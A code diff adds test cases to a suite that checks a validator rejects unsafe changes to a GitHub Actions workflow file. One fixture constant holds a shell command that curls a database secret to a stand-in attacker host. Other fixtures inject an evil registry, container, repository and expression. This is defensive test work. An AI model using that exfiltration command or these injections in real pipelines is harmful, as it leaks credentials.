@@ -349,6 +349,24 @@ red('job-health checks out another ref', edit(JOB_HEALTH, (d) => { jhJob(d).step
 red('job-health checks out another repository', edit(JOB_HEALTH, (d) => { jhJob(d).steps[0].with = { repository: 'evil/repo' }; }), /job-health\.yml.*R17.*with/);
 red('job-health uses a checkout path that is not the action', edit(JOB_HEALTH, (d) => { jhJob(d).steps[0].uses = 'actions/checkout@v4/../evil'; }), /job-health\.yml.*R17.*uses/);
 red('job-health gives setup-node another with key', edit(JOB_HEALTH, (d) => { jhJob(d).steps[1].with['registry-url'] = 'https://evil.example'; }), /job-health\.yml.*R17.*with/);
+// R17 whitelists keys: a key the check never read could carry the secret to unreviewed code while the check stays green.
+const SHELL_EVIL = "bash -c 'curl -d \"$SUPABASE_DB_URL\" https://evil.example; exit 0' {0}";
+const npmCi = (d) => jhJob(d).steps.find((s) => /npm ci/.test(s.run ?? ''));
+red('job-health\'s check step names a shell', edit(JOB_HEALTH, (d) => { jhStep(d).shell = SHELL_EVIL; }), /job-health\.yml.*R17.*shell/);
+red('job-health\'s npm ci step names a shell', edit(JOB_HEALTH, (d) => { npmCi(d).shell = SHELL_EVIL; }), /job-health\.yml.*R17.*shell/);
+red('job-health\'s job sets defaults.run.shell', edit(JOB_HEALTH, (d) => { jhJob(d).defaults = { run: { shell: SHELL_EVIL } }; }), /job-health\.yml.*R17.*defaults/);
+red('job-health\'s job sets defaults.run.working-directory', edit(JOB_HEALTH, (d) => { jhJob(d).defaults = { run: { 'working-directory': 'evil' } }; }), /job-health\.yml.*R17.*defaults/);
+red('job-health\'s workflow sets defaults', edit(JOB_HEALTH, (d) => { d.defaults = { run: { shell: SHELL_EVIL } }; }), /job-health\.yml.*R17.*defaults/);
+red('job-health\'s check step has a working-directory', edit(JOB_HEALTH, (d) => { jhStep(d)['working-directory'] = 'evil'; }), /job-health\.yml.*R17.*working-directory/);
+red('job-health\'s job runs in a container', edit(JOB_HEALTH, (d) => { jhJob(d).container = 'evil/image:latest'; }), /job-health\.yml.*R17.*container/);
+red('job-health runs on a self-hosted runner', edit(JOB_HEALTH, (d) => { jhJob(d)['runs-on'] = ['self-hosted', 'evil']; }), /job-health\.yml.*R17.*runs-on/);
+red('job-health widens permissions to contents: write', edit(JOB_HEALTH, (d) => { d.permissions = { contents: 'write' }; }), /job-health\.yml.*R17.*permissions/);
+red('job-health drops its permissions', edit(JOB_HEALTH, (d) => { delete d.permissions; }), /job-health\.yml.*R17.*permissions/);
+red('job-health\'s job declares services with no env', edit(JOB_HEALTH, (d) => { jhJob(d).services = { x: { image: 'evil/image:latest' } }; }), /job-health\.yml.*R17.*services/);
+red('job-health\'s job has a key the shape does not list', edit(JOB_HEALTH, (d) => { jhJob(d).outputs = { x: 'y' }; }), /job-health\.yml.*R17.*outputs/);
+red('job-health\'s workflow has a key the shape does not list', edit(JOB_HEALTH, (d) => { d['run-name'] = '${{ github.event.head_commit.message }}'; }), /job-health\.yml.*R17.*run-name/);
+red('job-health\'s job timeout is an expression', edit(JOB_HEALTH, (d) => { jhJob(d)['timeout-minutes'] = '${{ vars.X }}'; }), /job-health\.yml.*R17.*timeout-minutes/);
+red('job-health\'s step has an id', edit(JOB_HEALTH, (d) => { jhStep(d).id = 'x'; }), /job-health\.yml.*R17.*id/);
 // R8 reads only workflows that declare a Postgres service: job-health.yml declares none, and says nothing of R8.
 red('job-health.yml given an unpinned postgres service is named by R8', edit(JOB_HEALTH, (d) => { jhJob(d).services = { db: { image: 'postgres:17' } }; }), /job-health\.yml.*R8/);
 
